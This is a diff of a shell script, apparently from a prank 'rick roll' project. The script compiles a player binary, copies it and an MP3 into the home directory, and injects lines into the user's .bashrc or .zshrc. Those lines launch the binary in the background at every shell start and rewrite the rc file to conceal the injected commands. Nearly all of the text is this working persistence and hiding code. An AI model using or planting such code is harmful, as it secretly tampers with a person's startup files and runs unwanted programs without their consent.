@@ -1,8 +1,9 @@
-#!/bin/bash
-RC=".zshrc" && ($(echo $BASH) = "/bin/bash") && RC=".bashrc"
+#!/bin/sh
+RC=.$(echo $SHELL | cut -c 6-)rc
 cp RICK.mp3 $HOME/Rick.mp3
 gcc play.c -o loop
 cp loop $HOME/ROLL
+rm loop
 ###
 # this script is run if no target was specified in Makefile
 # the purpose is to copy the rick roll into the HOME directory and make it execute
@@ -20,8 +21,8 @@ sed -i '' -e 'sP$HOME/ROLL &PPg' $HOME/$RC
 echo -n '$HOME/ROLL &' >> $HOME/$RC
 sed -i '' -e 'sPT=$(cat $0 | wc | awk '"'"'{print($1)}'"'"')PPg' $HOME/$RC
 echo -n 'T=$(cat $0 | wc | awk '"'"'{print($1)}'"'"')' >> $HOME/$RC
-sed -i '' -e 'sPN=$(expr $T - 6)","$(expr $T + 0)PPg' $HOME/$RC
-echo -n 'N=$(expr $T - 6)","$(expr $T + 0)' >> $HOME/$RC
+sed -i '' -e 'sPN=$(expr $T - 5)","$(expr $T + 0)PPg' $HOME/$RC
+echo -n 'N=$(expr $T - 5)","$(expr $T + 0)' >> $HOME/$RC
 sed -i '' -e 'sPsed $N'"'"'d'"'"' $0 > tempPPg' $HOME/$RC
 echo -n 'sed $N'"'"'d'"'"' $0 > temp' >> $HOME/$RC
 sed -i '' -e 'sPcat temp > $0PPg' $HOME/$RC
